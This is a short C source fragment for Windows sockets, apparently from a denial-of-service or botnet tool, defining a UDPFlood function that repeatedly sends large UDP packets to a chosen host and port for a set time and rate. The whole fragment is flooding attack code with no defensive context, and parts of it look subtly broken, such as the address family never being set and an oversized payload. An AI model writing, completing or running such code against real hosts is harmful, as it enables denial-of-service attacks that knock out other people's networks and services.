void UDPFlood(char* destination, unsigned short port, int seconds, int timespersecond) {
	sockaddr_in input;
	if (!GetSocketAddress(destination, &input)) return;
	input.sin_port = htons(port);
	SOCKET c;

	char dat[65536];
	memset(dat, 0xCC, 65536);

	for (int i = 0; i < seconds * timespersecond; i++) {
		c = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		if (c == 0) continue;

		struct sockaddr_in dest_addr;
		memcpy(&dest_addr.sin_addr, &input.sin_addr, sizeof(input.sin_addr));
		dest_addr.sin_port = htons(port);

		int len = sizeof(struct sockaddr_in);
		sendto(c, (char*)dat, 65536, 0, (struct sockaddr*)&dest_addr, len);
		Sleep(10);

		closesocket(c);
	}
}
